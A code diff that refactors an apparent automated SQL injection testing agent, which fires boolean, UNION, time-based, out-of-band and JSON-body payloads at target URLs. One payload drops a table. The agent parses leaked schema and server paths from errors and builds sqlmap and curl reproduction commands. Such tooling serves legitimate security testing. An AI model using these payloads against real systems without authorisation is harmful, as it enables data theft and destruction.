@@ -344,48 +344,43 @@ class SQLiAgent(BaseAgent):
             "tables": [],
             "columns_count": None
         }
-        
-        # Extract Payload
-        # Payload: id=1 AND 7524=7524
-        payload_match = re.search(r"Payload: (.+)", output)
-        if payload_match:
-            details["working_payload"] = payload_match.group(1).strip()
-            
-        # Extract Type
-        # Type: boolean-based blind
-        type_match = re.search(r"Type: (.+)", output)
-        if type_match:
-            details["injection_type"] = type_match.group(1).strip()
-            
-        # Extract DBMS
-        # back-end DBMS: MySQL >= 5.0.0
-        dbms_match = re.search(r"back-end DBMS: (.+)", output)
-        if dbms_match:
-            details["dbms"] = dbms_match.group(1).strip()
-            
-        # Extract Databases
-        # available databases [2]:
-        # [*] information_schema
-        # [*] testdb
-        if "available databases" in output:
-            dbs = re.findall(r"\[\*\] (.+)", output)
-            # Filter out generic progress messages
-            details["databases"] = [db for db in dbs if not db.startswith("ending") and " " not in db]
-            
-        # Extract Tables
-        # Database: testdb
-        # [2 tables]
-        # +-------+
-        # | users |
-        # | admin |
-        # +-------+
-        # This is harder to regex reliably from simple text output, simplified:
-        if "Database:" in output and "+" in output:
-            # Look for table - like lines inside borders
-            possible_tables = re.findall(r"\| (.+?) \|", output)
-            details["tables"] = [t.strip() for t in possible_tables if t.strip() != "table_name"]
+
+        details["working_payload"] = self._extract_sqlmap_payload(output)
+        details["injection_type"] = self._extract_sqlmap_type(output)
+        details["dbms"] = self._extract_sqlmap_dbms(output)
+        details["databases"] = self._extract_sqlmap_databases(output)
+        details["tables"] = self._extract_sqlmap_tables(output)
 
         return details
+
+    def _extract_sqlmap_payload(self, output: str) -> str:
+        """Extract payload from SQLMap output."""
+        payload_match = re.search(r"Payload: (.+)", output)
+        return payload_match.group(1).strip() if payload_match else ""
+
+    def _extract_sqlmap_type(self, output: str) -> str:
+        """Extract injection type from SQLMap output."""
+        type_match = re.search(r"Type: (.+)", output)
+        return type_match.group(1).strip() if type_match else "unknown"
+
+    def _extract_sqlmap_dbms(self, output: str) -> str:
+        """Extract DBMS from SQLMap output."""
+        dbms_match = re.search(r"back-end DBMS: (.+)", output)
+        return dbms_match.group(1).strip() if dbms_match else "unknown"
+
+    def _extract_sqlmap_databases(self, output: str) -> List[str]:
+        """Extract databases from SQLMap output."""
+        if "available databases" not in output:
+            return []
+        dbs = re.findall(r"\[\*\] (.+)", output)
+        return [db for db in dbs if not db.startswith("ending") and " " not in db]
+
+    def _extract_sqlmap_tables(self, output: str) -> List[str]:
+        """Extract tables from SQLMap output."""
+        if "Database:" not in output or "+" not in output:
+            return []
+        possible_tables = re.findall(r"\| (.+?) \|", output)
+        return [t.strip() for t in possible_tables if t.strip() != "table_name"]
 
     def _build_exploit_url(self, url: str, param: str, payload: str) -> Tuple[str, str]:
         """Build raw and encoded exploit URLs."""
@@ -625,42 +620,59 @@ class SQLiAgent(BaseAgent):
         if not error_response:
             return info
 
-        # Extract table names
+        info["tables_leaked"] = self._extract_tables_from_error(error_response)
+        info["columns_leaked"] = self._extract_columns_from_error(error_response)
+        info["server_paths"] = self._extract_paths_from_error(error_response)
+        info["db_type"], info["db_version"] = self._extract_db_version(error_response)
+
+        if not info["db_type"]:
+            info["db_type"] = self._detect_database_type(error_response)
+
+        return info
+
+    def _extract_tables_from_error(self, error_response: str) -> List[str]:
+        """Extract table names from error message."""
         table_patterns = [
             r"table ['\"`]?(\w+)['\"`]?",
             r"FROM ['\"`]?(\w+)['\"`]?",
             r"INTO ['\"`]?(\w+)['\"`]?",
             r"UPDATE ['\"`]?(\w+)['\"`]?",
         ]
+        tables = []
         for pattern in table_patterns:
             matches = re.findall(pattern, error_response, re.IGNORECASE)
-            info["tables_leaked"].extend(matches)
-        info["tables_leaked"] = list(set(info["tables_leaked"]))
+            tables.extend(matches)
+        return list(set(tables))
 
-        # Extract column names
+    def _extract_columns_from_error(self, error_response: str) -> List[str]:
+        """Extract column names from error message."""
         column_patterns = [
             r"column ['\"`]?(\w+)['\"`]?",
             r"Unknown column ['\"`]?(\w+)['\"`]?",
             r"field ['\"`]?(\w+)['\"`]?",
         ]
+        columns = []
         for pattern in column_patterns:
             matches = re.findall(pattern, error_response, re.IGNORECASE)
-            info["columns_leaked"].extend(matches)
-        info["columns_leaked"] = list(set(info["columns_leaked"]))
+            columns.extend(matches)
+        return list(set(columns))
 
-        # Extract server paths
+    def _extract_paths_from_error(self, error_response: str) -> List[str]:
+        """Extract server paths from error message."""
         path_patterns = [
             r"(/[\w/.-]+\.php)",
             r"(/var/www/[\w/.-]+)",
             r"(C:\\[\w\\.-]+)",
             r"(/home/[\w/.-]+)",
         ]
+        paths = []
         for pattern in path_patterns:
             matches = re.findall(pattern, error_response)
-            info["server_paths"].extend(matches)
-        info["server_paths"] = list(set(info["server_paths"]))
+            paths.extend(matches)
+        return list(set(paths))
 
-        # Extract DB version
+    def _extract_db_version(self, error_response: str) -> Tuple[Optional[str], Optional[str]]:
+        """Extract database type and version from error message."""
         version_patterns = [
             r"(MySQL|MariaDB)[\s/]*([\d.]+)",
             r"(PostgreSQL)[\s/]*([\d.]+)",
@@ -671,15 +683,8 @@ class SQLiAgent(BaseAgent):
         for pattern in version_patterns:
             match = re.search(pattern, error_response, re.IGNORECASE)
             if match:
-                info["db_type"] = match.group(1)
-                info["db_version"] = f"{match.group(1)} {match.group(2)}"
-                break
-
-        # Fingerprint DB type if not found in version
-        if not info["db_type"]:
-            info["db_type"] = self._detect_database_type(error_response)
-
-        return info
+                return match.group(1), f"{match.group(1)} {match.group(2)}"
+        return None, None
 
     def _detect_database_type(self, response_text: str) -> Optional[str]:
         """Fingerprint database type from error messages."""
@@ -725,57 +730,66 @@ class SQLiAgent(BaseAgent):
 
         for payload_template in payloads:
             payload = payload_template.format(oob_host=oob_host)
-
-            # Apply filter mutations if needed
             payload_variants = self._mutate_payload_for_filters(payload)
 
             for variant in payload_variants:
-                try:
-                    test_url = self._build_url_with_param(base_url, param, f"1{variant}")
-
-                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                        await resp.text()
-
-                    # Wait briefly for DNS callback
-                    await asyncio.sleep(2)
-
-                    # Check for callback
-                    interactions = await self._interactsh.poll()
-                    if interactions:
-                        for interaction in interactions:
-                            if "sqli" in interaction.get("full-id", ""):
-                                self._stats["oob_callbacks"] += 1
-                                logger.info(f"[{self.name}] 🎯 OOB SQLi callback received!")
-
-                                exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, variant)
-                                curl_cmd = f"curl '{exploit_url_encoded}'"
-                                
-                                return SQLiFinding(
-                                    url=self.url,
-                                    parameter=param,
-                                    injection_type="out-of-band",
-                                    technique="oob",
-                                    working_payload=variant,
-                                    payload_encoded=variant,
-                                    exploit_url=exploit_url,
-                                    exploit_url_encoded=exploit_url_encoded,
-                                    dbms_detected=db_type,
-                                    sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=U --batch",
-                                    curl_command=curl_cmd,
-                                    sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --dbs --technique=U",
-                                    validated=True,
-                                    status="VALIDATED_CONFIRMED",
-                                    evidence={
-                                        "oob_callback_received": True,
-                                        "interaction_data": interaction,
-                                        "db_type": db_type,
-                                    },
-                                    reproduction_steps=self._generate_repro_steps(self.url, param, variant, curl_cmd)
-                                )
-                except Exception as e:
-                    logger.debug(f"OOB test failed: {e}")
+                finding = await self._test_oob_variant(session, base_url, param, variant, db_type)
+                if finding:
+                    return finding
 
         return None
+
+    async def _test_oob_variant(self, session: aiohttp.ClientSession, base_url: str,
+                                param: str, variant: str, db_type: str) -> Optional[SQLiFinding]:
+        """Test a single OOB payload variant."""
+        try:
+            test_url = self._build_url_with_param(base_url, param, f"1{variant}")
+
+            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                await resp.text()
+
+            await asyncio.sleep(2)
+
+            interactions = await self._interactsh.poll()
+            if interactions:
+                for interaction in interactions:
+                    if "sqli" in interaction.get("full-id", ""):
+                        return self._create_oob_finding(param, variant, db_type, interaction)
+        except Exception as e:
+            logger.debug(f"OOB test failed: {e}")
+
+        return None
+
+    def _create_oob_finding(self, param: str, variant: str, db_type: str, interaction: Dict) -> SQLiFinding:
+        """Create finding for OOB SQL injection."""
+        self._stats["oob_callbacks"] += 1
+        logger.info(f"[{self.name}] 🎯 OOB SQLi callback received!")
+
+        exploit_url, exploit_url_encoded = self._build_exploit_url(self.url, param, variant)
+        curl_cmd = f"curl '{exploit_url_encoded}'"
+
+        return SQLiFinding(
+            url=self.url,
+            parameter=param,
+            injection_type="out-of-band",
+            technique="oob",
+            working_payload=variant,
+            payload_encoded=variant,
+            exploit_url=exploit_url,
+            exploit_url_encoded=exploit_url_encoded,
+            dbms_detected=db_type,
+            sqlmap_command=f"sqlmap -u '{self.url}' -p {param} --technique=U --batch",
+            curl_command=curl_cmd,
+            sqlmap_reproduce_command=f"sqlmap -u '{self.url}' -p {param} --batch --dbs --technique=U",
+            validated=True,
+            status="VALIDATED_CONFIRMED",
+            evidence={
+                "oob_callback_received": True,
+                "interaction_data": interaction,
+                "db_type": db_type,
+            },
+            reproduction_steps=self._generate_repro_steps(self.url, param, variant, curl_cmd)
+        )
 
     # =========================================================================
     # TRIPLE TIME-BASED VERIFICATION
@@ -794,59 +808,23 @@ class SQLiAgent(BaseAgent):
         Returns (is_vulnerable, evidence)
         """
         base_url = self._get_base_url()
-        evidence = {
-            "triple_verified": False,
-            "baseline_time": 0,
-            "short_sleep_time": 0,
-            "long_sleep_time": 0,
-        }
+        evidence = {"triple_verified": False, "baseline_time": 0, "short_sleep_time": 0, "long_sleep_time": 0}
 
         try:
-            # 1. Baseline (no injection)
-            start = time.time()
-            test_url = self._build_url_with_param(base_url, param, "1")
-            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                await resp.text()
-            baseline_time = time.time() - start
+            baseline_time = await self._measure_baseline_time(session, base_url, param)
             evidence["baseline_time"] = baseline_time
 
-            # If baseline is already slow (>3s), can't reliably test time-based
             if baseline_time > 3:
                 logger.debug(f"[{self.name}] Baseline too slow ({baseline_time:.1f}s), skipping time-based")
                 return False, evidence
 
-            # 2. Short sleep (3 seconds)
-            short_payload = payload_template.replace("SLEEP(5)", "SLEEP(3)").replace("SLEEP(10)", "SLEEP(3)")
-            short_payload = short_payload.replace("pg_sleep(5)", "pg_sleep(3)").replace("pg_sleep(10)", "pg_sleep(3)")
-            short_payload = short_payload.replace("WAITFOR DELAY '0:0:5'", "WAITFOR DELAY '0:0:3'")
-
-            start = time.time()
-            test_url = self._build_url_with_param(base_url, param, f"1{short_payload}")
-            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
-                await resp.text()
-            short_time = time.time() - start
+            short_time = await self._measure_sleep_time(session, base_url, param, payload_template, 3, 15)
             evidence["short_sleep_time"] = short_time
 
-            # 3. Long sleep (10 seconds)
-            long_payload = payload_template.replace("SLEEP(5)", "SLEEP(10)").replace("SLEEP(3)", "SLEEP(10)")
-            long_payload = long_payload.replace("pg_sleep(5)", "pg_sleep(10)").replace("pg_sleep(3)", "pg_sleep(10)")
-            long_payload = long_payload.replace("WAITFOR DELAY '0:0:5'", "WAITFOR DELAY '0:0:10'")
-
-            start = time.time()
-            test_url = self._build_url_with_param(base_url, param, f"1{long_payload}")
-            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=20)) as resp:
-                await resp.text()
-            long_time = time.time() - start
+            long_time = await self._measure_sleep_time(session, base_url, param, payload_template, 10, 20)
             evidence["long_sleep_time"] = long_time
 
-            # Verify correlation: baseline < short < long
-            # With reasonable tolerances
-            if (baseline_time < 2 and
-                2 < short_time < 6 and
-                8 < long_time < 15 and
-                short_time > baseline_time + 2 and
-                long_time > short_time + 5):
-
+            if self._verify_time_correlation(baseline_time, short_time, long_time):
                 evidence["triple_verified"] = True
                 logger.info(f"[{self.name}] ✅ Time-based TRIPLE VERIFIED: base={baseline_time:.1f}s, short={short_time:.1f}s, long={long_time:.1f}s")
                 return True, evidence
@@ -855,12 +833,49 @@ class SQLiAgent(BaseAgent):
             return False, evidence
 
         except asyncio.TimeoutError:
-            # Timeout might indicate successful time injection
             evidence["timeout_occurred"] = True
             return False, evidence
         except Exception as e:
             logger.debug(f"Time-based verification error: {e}")
             return False, evidence
+
+    async def _measure_baseline_time(self, session: aiohttp.ClientSession,
+                                     base_url: str, param: str) -> float:
+        """Measure baseline response time without injection."""
+        start = time.time()
+        test_url = self._build_url_with_param(base_url, param, "1")
+        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
+            await resp.text()
+        return time.time() - start
+
+    async def _measure_sleep_time(self, session: aiohttp.ClientSession, base_url: str,
+                                  param: str, payload_template: str, sleep_seconds: int,
+                                  timeout: int) -> float:
+        """Measure response time with sleep payload."""
+        payload = self._create_sleep_payload(payload_template, sleep_seconds)
+        start = time.time()
+        test_url = self._build_url_with_param(base_url, param, f"1{payload}")
+        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
+            await resp.text()
+        return time.time() - start
+
+    def _create_sleep_payload(self, payload_template: str, sleep_seconds: int) -> str:
+        """Create sleep payload with specified duration."""
+        payload = payload_template
+        for old_sleep in ["SLEEP(5)", "SLEEP(10)", "SLEEP(3)"]:
+            payload = payload.replace(old_sleep, f"SLEEP({sleep_seconds})")
+        for old_sleep in ["pg_sleep(5)", "pg_sleep(10)", "pg_sleep(3)"]:
+            payload = payload.replace(old_sleep, f"pg_sleep({sleep_seconds})")
+        payload = payload.replace("WAITFOR DELAY '0:0:5'", f"WAITFOR DELAY '0:0:{sleep_seconds}'")
+        return payload
+
+    def _verify_time_correlation(self, baseline_time: float, short_time: float, long_time: float) -> bool:
+        """Verify correlation: baseline < short < long with reasonable tolerances."""
+        return (baseline_time < 2 and
+                2 < short_time < 6 and
+                8 < long_time < 15 and
+                short_time > baseline_time + 2 and
+                long_time > short_time + 5)
 
     # =========================================================================
     # JSON/API BODY INJECTION
@@ -873,109 +888,120 @@ class SQLiAgent(BaseAgent):
         Test for SQL injection in JSON POST body parameters.
         """
         findings = []
-
-        def flatten_json(obj, prefix=""):
-            """Flatten nested JSON to dot-notation keys."""
-            items = {}
-            if isinstance(obj, dict):
-                for k, v in obj.items():
-                    new_key = f"{prefix}.{k}" if prefix else k
-                    if isinstance(v, (dict, list)):
-                        items.update(flatten_json(v, new_key))
-                    else:
-                        items[new_key] = v
-            elif isinstance(obj, list):
-                for i, v in enumerate(obj):
-                    new_key = f"{prefix}[{i}]"
-                    if isinstance(v, (dict, list)):
-                        items.update(flatten_json(v, new_key))
-                    else:
-                        items[new_key] = v
-            return items
-
-        def set_nested_value(obj, key_path, value):
-            """Set value in nested structure using dot notation."""
-            import copy
-            obj = copy.deepcopy(obj)
-            keys = re.split(r'\.|\[|\]', key_path)
-            keys = [k for k in keys if k]
-
-            current = obj
-            for i, key in enumerate(keys[:-1]):
-                if key.isdigit():
-                    key = int(key)
-                current = current[key]
-
-            final_key = keys[-1]
-            if final_key.isdigit():
-                final_key = int(final_key)
-            current[final_key] = value
-            return obj
-
-        flat_params = flatten_json(json_body)
+        flat_params = self._flatten_json(json_body)
 
         for key, value in flat_params.items():
             if not isinstance(value, (str, int)):
                 continue
 
-            # Test with single quote
-            test_payloads = [
-                f"{value}'",
-                f"{value}' OR '1'='1",
-                f"{value}' AND '1'='2",
-            ]
-
-            for payload in test_payloads:
-                try:
-                    test_body = set_nested_value(json_body, key, payload)
-
-                    headers = {"Content-Type": "application/json"}
-                    headers.update(self.headers)
-
-                    async with session.post(
-                        url,
-                        json=test_body,
-                        headers=headers,
-                        timeout=aiohttp.ClientTimeout(total=10)
-                    ) as resp:
-                        content = await resp.text()
-
-                        # Check for SQL errors
-                        error_info = self._extract_info_from_error(content)
-
-                        if error_info.get("db_type") or error_info.get("tables_leaked"):
-                            curl_cmd = f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(test_body)}'"
-                            
-                            findings.append(SQLiFinding(
-                                url=url,
-                                parameter=f"JSON:{key}",
-                                injection_type="error-based (JSON)",
-                                technique="error_based",
-                                working_payload=payload,
-                                payload_encoded=payload,
-                                exploit_url=url,
-                                exploit_url_encoded=url,
-                                dbms_detected=error_info.get("db_type", "unknown"),
-                                extracted_tables=error_info.get("tables_leaked", []),
-                                sqlmap_command=f"sqlmap -u '{url}' --data='{json.dumps(json_body)}' -p '{key}' --technique=E",
-                                curl_command=curl_cmd,
-                                sqlmap_reproduce_command=f"sqlmap -u '{url}' --data='{json.dumps(test_body)}' --technique=E",
-                                validated=True,
-                                status="VALIDATED_CONFIRMED",
-                                evidence={
-                                    "sql_error_visible": True,
-                                    "method": "POST",
-                                    "content_type": "application/json",
-                                    **error_info
-                                },
-                                reproduction_steps=self._generate_repro_steps(url, f"JSON:{key}", payload, curl_cmd)
-                            ))
-                            logger.info(f"[{self.name}] 🎯 JSON SQLi found in {key}")
-                            return findings  # Early exit on first finding
-                except Exception as e:
-                    logger.debug(f"JSON injection test failed: {e}")
+            finding = await self._test_json_parameter(session, url, json_body, key, value)
+            if finding:
+                findings.append(finding)
+                logger.info(f"[{self.name}] 🎯 JSON SQLi found in {key}")
+                return findings
 
         return findings
+
+    def _flatten_json(self, obj, prefix=""):
+        """Flatten nested JSON to dot-notation keys."""
+        items = {}
+        if isinstance(obj, dict):
+            for k, v in obj.items():
+                new_key = f"{prefix}.{k}" if prefix else k
+                if isinstance(v, (dict, list)):
+                    items.update(self._flatten_json(v, new_key))
+                else:
+                    items[new_key] = v
+        elif isinstance(obj, list):
+            for i, v in enumerate(obj):
+                new_key = f"{prefix}[{i}]"
+                if isinstance(v, (dict, list)):
+                    items.update(self._flatten_json(v, new_key))
+                else:
+                    items[new_key] = v
+        return items
+
+    def _set_nested_value(self, obj, key_path, value):
+        """Set value in nested structure using dot notation."""
+        import copy
+        obj = copy.deepcopy(obj)
+        keys = re.split(r'\.|\[|\]', key_path)
+        keys = [k for k in keys if k]
+
+        current = obj
+        for i, key in enumerate(keys[:-1]):
+            if key.isdigit():
+                key = int(key)
+            current = current[key]
+
+        final_key = keys[-1]
+        if final_key.isdigit():
+            final_key = int(final_key)
+        current[final_key] = value
+        return obj
+
+    async def _test_json_parameter(self, session: aiohttp.ClientSession, url: str,
+                                   json_body: Dict, key: str, value) -> Optional[SQLiFinding]:
+        """Test a single JSON parameter for SQL injection."""
+        test_payloads = [
+            f"{value}'",
+            f"{value}' OR '1'='1",
+            f"{value}' AND '1'='2",
+        ]
+
+        for payload in test_payloads:
+            try:
+                test_body = self._set_nested_value(json_body, key, payload)
+
+                headers = {"Content-Type": "application/json"}
+                headers.update(self.headers)
+
+                async with session.post(
+                    url,
+                    json=test_body,
+                    headers=headers,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                ) as resp:
+                    content = await resp.text()
+
+                    error_info = self._extract_info_from_error(content)
+
+                    if error_info.get("db_type") or error_info.get("tables_leaked"):
+                        return self._create_json_finding(url, key, payload, json_body, test_body, error_info)
+            except Exception as e:
+                logger.debug(f"JSON injection test failed: {e}")
+
+        return None
+
+    def _create_json_finding(self, url: str, key: str, payload: str,
+                            json_body: Dict, test_body: Dict, error_info: Dict) -> SQLiFinding:
+        """Create finding for JSON SQL injection."""
+        curl_cmd = f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{json.dumps(test_body)}'"
+
+        return SQLiFinding(
+            url=url,
+            parameter=f"JSON:{key}",
+            injection_type="error-based (JSON)",
+            technique="error_based",
+            working_payload=payload,
+            payload_encoded=payload,
+            exploit_url=url,
+            exploit_url_encoded=url,
+            dbms_detected=error_info.get("db_type", "unknown"),
+            extracted_tables=error_info.get("tables_leaked", []),
+            sqlmap_command=f"sqlmap -u '{url}' --data='{json.dumps(json_body)}' -p '{key}' --technique=E",
+            curl_command=curl_cmd,
+            sqlmap_reproduce_command=f"sqlmap -u '{url}' --data='{json.dumps(test_body)}' --technique=E",
+            validated=True,
+            status="VALIDATED_CONFIRMED",
+            evidence={
+                "sql_error_visible": True,
+                "method": "POST",
+                "content_type": "application/json",
+                **error_info
+            },
+            reproduction_steps=self._generate_repro_steps(url, f"JSON:{key}", payload, curl_cmd)
+        )
 
     # =========================================================================
     # SECOND-ORDER SQLi DETECTION
@@ -991,53 +1017,63 @@ class SQLiAgent(BaseAgent):
         if not self.observation_points:
             return None
 
-        # Payloads designed to be stored and executed later
         second_order_payloads = [
-            "admin'-- ",
-            "' OR '1'='1'-- ",
-            "test'; DROP TABLE test;-- ",
-            "test' UNION SELECT 1,2,3-- ",
+            "admin'-- ", "' OR '1'='1'-- ",
+            "test'; DROP TABLE test;-- ", "test' UNION SELECT 1,2,3-- ",
         ]
 
         base_url = self._get_base_url()
 
         for payload in second_order_payloads:
-            try:
-                # Step 1: Inject the payload
-                inject_url = self._build_url_with_param(base_url, injection_param, payload)
-                async with session.get(inject_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                    await resp.text()
+            finding = await self._test_second_order_payload(session, base_url, injection_param, payload)
+            if finding:
+                return finding
 
-                # Step 2: Check observation points for SQL errors
-                for obs_url in self.observation_points:
-                    async with session.get(obs_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                        content = await resp.text()
+        return None
 
-                        error_info = self._extract_info_from_error(content)
+    async def _test_second_order_payload(self, session: aiohttp.ClientSession, base_url: str,
+                                         injection_param: str, payload: str) -> Optional[Dict]:
+        """Test a single second-order payload."""
+        try:
+            inject_url = self._build_url_with_param(base_url, injection_param, payload)
+            async with session.get(inject_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                await resp.text()
 
-                        if error_info.get("db_type") or error_info.get("tables_leaked"):
-                            logger.info(f"[{self.name}] 🎯 Second-Order SQLi detected!")
-                            return {
-                                "type": "SQLI",
-                                "subtype": "Second-Order",
-                                "url": self.url,
-                                "injection_point": f"{injection_url}?{injection_param}",
-                                "trigger_point": obs_url,
-                                "parameter": injection_param,
-                                "payload": payload,
-                                "technique": "second_order",
-                                "evidence": {
-                                    "sql_error_visible": True,
-                                    **error_info
-                                },
-                                "severity": "CRITICAL",
-                                "validated": True,
-                                "status": "VALIDATED_CONFIRMED",
-                                "description": f"Second-Order SQL Injection confirmed. Payload injected at '{injection_param}' triggers error at '{obs_url}'. DB: {error_info.get('db_type', 'unknown')}",
-                                "reproduction": f"# Step 1: Inject payload\ncurl '{inject_url}'\n# Step 2: Trigger at observation point\ncurl '{obs_url}'"
-                            }
-            except Exception as e:
-                logger.debug(f"Second-order test failed: {e}")
+            for obs_url in self.observation_points:
+                finding = await self._check_observation_point(session, obs_url, inject_url, injection_param, payload)
+                if finding:
+                    return finding
+        except Exception as e:
+            logger.debug(f"Second-order test failed: {e}")
+
+        return None
+
+    async def _check_observation_point(self, session: aiohttp.ClientSession, obs_url: str,
+                                       inject_url: str, injection_param: str, payload: str) -> Optional[Dict]:
+        """Check observation point for second-order SQL injection."""
+        async with session.get(obs_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            content = await resp.text()
+
+            error_info = self._extract_info_from_error(content)
+
+            if error_info.get("db_type") or error_info.get("tables_leaked"):
+                logger.info(f"[{self.name}] 🎯 Second-Order SQLi detected!")
+                return {
+                    "type": "SQLI",
+                    "subtype": "Second-Order",
+                    "url": self.url,
+                    "injection_point": f"{inject_url}?{injection_param}",
+                    "trigger_point": obs_url,
+                    "parameter": injection_param,
+                    "payload": payload,
+                    "technique": "second_order",
+                    "evidence": {"sql_error_visible": True, **error_info},
+                    "severity": "CRITICAL",
+                    "validated": True,
+                    "status": "VALIDATED_CONFIRMED",
+                    "description": f"Second-Order SQL Injection confirmed. Payload injected at '{injection_param}' triggers error at '{obs_url}'. DB: {error_info.get('db_type', 'unknown')}",
+                    "reproduction": f"# Step 1: Inject payload\ncurl '{inject_url}'\n# Step 2: Trigger at observation point\ncurl '{obs_url}'"
+                }
 
         return None
 
@@ -1100,14 +1136,9 @@ class SQLiAgent(BaseAgent):
         """
         Build complete SQLMap command for reproduction.
         """
-        # Map technique to SQLMap code
         technique_map = {
-            "error_based": "E",
-            "boolean_based": "B",
-            "union_based": "U",
-            "stacked": "S",
-            "time_based": "T",
-            "oob": "E",  # OOB uses error-based techniques
+            "error_based": "E", "boolean_based": "B", "union_based": "U",
+            "stacked": "S", "time_based": "T", "oob": "E",
         }
         tech_code = technique_map.get(technique, "BEUS")
 
@@ -1118,15 +1149,23 @@ class SQLiAgent(BaseAgent):
             f"--technique={tech_code}",
         ]
 
-        # Add DB-specific options
         if db_type:
             cmd_parts.append(f"--dbms={db_type.lower()}")
 
-        # Add tamper scripts
+        self._add_tamper_scripts(cmd_parts, tamper)
+        self._add_cookies_and_headers(cmd_parts)
+
+        if extra_options:
+            for key, value in extra_options.items():
+                cmd_parts.append(f"--{key}={value}" if value else f"--{key}")
+
+        return " \\\n  ".join(cmd_parts)
+
+    def _add_tamper_scripts(self, cmd_parts: List[str], tamper: Optional[str]):
+        """Add tamper scripts to SQLMap command."""
         if tamper:
             cmd_parts.append(f"--tamper={tamper}")
         elif self._detected_filters:
-            # Auto-suggest tampers based on detected filters
             suggested_tampers = []
             if " " in self._detected_filters:
                 suggested_tampers.append("space2comment")
@@ -1137,21 +1176,14 @@ class SQLiAgent(BaseAgent):
             if suggested_tampers:
                 cmd_parts.append(f"--tamper={','.join(suggested_tampers)}")
 
-        # Add cookies if present
+    def _add_cookies_and_headers(self, cmd_parts: List[str]):
+        """Add cookies and headers to SQLMap command."""
         if self.cookies:
             cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
             cmd_parts.append(f"--cookie='{cookie_str}'")
 
-        # Add headers if present
         for name, value in self.headers.items():
             cmd_parts.append(f"--header='{name}: {value}'")
-
-        # Add extra options
-        if extra_options:
-            for key, value in extra_options.items():
-                cmd_parts.append(f"--{key}={value}" if value else f"--{key}")
-
-        return " \\\n  ".join(cmd_parts)
 
     def _build_progressive_sqlmap_commands(
         self, param: str, technique: str, db_type: Optional[str] = None
@@ -1211,31 +1243,8 @@ Include:
 
 Keep it professional and factual. Do not include actual exploit code."""
 
-            # Handle both Dict and SQLiFinding object
-            if isinstance(finding, dict):
-                url = finding.get('url')
-                param = finding.get('parameter')
-                technique = finding.get('technique', 'Unknown')
-                db_type = finding.get('evidence', {}).get('db_type', 'Unknown')
-                tables = finding.get('evidence', {}).get('tables_leaked', [])
-                columns = finding.get('evidence', {}).get('columns_leaked', [])
-            else:
-                url = finding.url
-                param = finding.parameter
-                technique = finding.injection_type
-                db_type = finding.dbms_detected
-                tables = finding.extracted_tables
-                columns = finding.columns_detected
-
-            user_prompt = f"""SQL Injection Finding:
-- URL: {url}
-- Parameter: {param}
-- Technique: {technique}
-- Database Type: {db_type}
-- Tables Leaked: {tables}
-- Columns Leaked: {columns}
-
-Write the exploitation explanation section for the report."""
+            finding_data = self._extract_finding_data(finding)
+            user_prompt = self._build_llm_prompt(finding_data)
 
             response = await llm_client.generate(
                 prompt=user_prompt,
@@ -1250,6 +1259,306 @@ Write the exploitation explanation section for the report."""
         except Exception as e:
             logger.debug(f"LLM explanation failed: {e}")
             return ""
+
+    def _extract_finding_data(self, finding: Any) -> Dict:
+        """Extract data from finding (handles both Dict and SQLiFinding)."""
+        if isinstance(finding, dict):
+            return {
+                'url': finding.get('url'),
+                'param': finding.get('parameter'),
+                'technique': finding.get('technique', 'Unknown'),
+                'db_type': finding.get('evidence', {}).get('db_type', 'Unknown'),
+                'tables': finding.get('evidence', {}).get('tables_leaked', []),
+                'columns': finding.get('evidence', {}).get('columns_leaked', [])
+            }
+        else:
+            return {
+                'url': finding.url,
+                'param': finding.parameter,
+                'technique': finding.injection_type,
+                'db_type': finding.dbms_detected,
+                'tables': finding.extracted_tables,
+                'columns': finding.columns_detected
+            }
+
+    def _build_llm_prompt(self, finding_data: Dict) -> str:
+        """Build LLM prompt from finding data."""
+        return f"""SQL Injection Finding:
+- URL: {finding_data['url']}
+- Parameter: {finding_data['param']}
+- Technique: {finding_data['technique']}
+- Database Type: {finding_data['db_type']}
+- Tables Leaked: {finding_data['tables']}
+- Columns Leaked: {finding_data['columns']}
+
+Write the exploitation explanation section for the report."""
+
+    # =========================================================================
+    # RUN LOOP HELPERS
+    # =========================================================================
+
+    def _configure_session(self, session: aiohttp.ClientSession):
+        """Configure session with cookies and headers."""
+        if self.cookies:
+            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
+            session.cookie_jar.update_cookies({"Cookie": cookie_str})
+
+    async def _initialize_baseline(self, session: aiohttp.ClientSession):
+        """Initialize baseline response and Interactsh."""
+        dashboard.log(f"[{self.name}] Phase 1: Initializing...", "INFO")
+
+        try:
+            start = time.time()
+            async with session.get(self.url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                baseline_content = await resp.text()
+                self._baseline_response_time = time.time() - start
+                self._baseline_content_length = len(baseline_content)
+                self._detected_db_type = self._detect_database_type(baseline_content)
+        except Exception as e:
+            logger.warning(f"Baseline failed: {e}")
+
+        await self._init_interactsh()
+
+    async def _extract_and_prioritize_params(self) -> List[str]:
+        """Extract and prioritize parameters from URL and POST data."""
+        parsed = urlparse(self.url)
+        params = list(parse_qs(parsed.query).keys())
+
+        if self.param and self.param not in params:
+            params.insert(0, self.param)
+
+        if self.post_data:
+            post_params = self._extract_post_params(self.post_data)
+            params.extend(post_params)
+
+        params = self._prioritize_params(list(set(params)))
+
+        if not params:
+            params = ["id"]
+
+        return params
+
+    async def _test_all_parameters(self, session: aiohttp.ClientSession,
+                                   params: List[str], findings: List) -> List:
+        """Test all parameters for SQL injection."""
+        for param in params:
+            if self._max_impact_achieved:
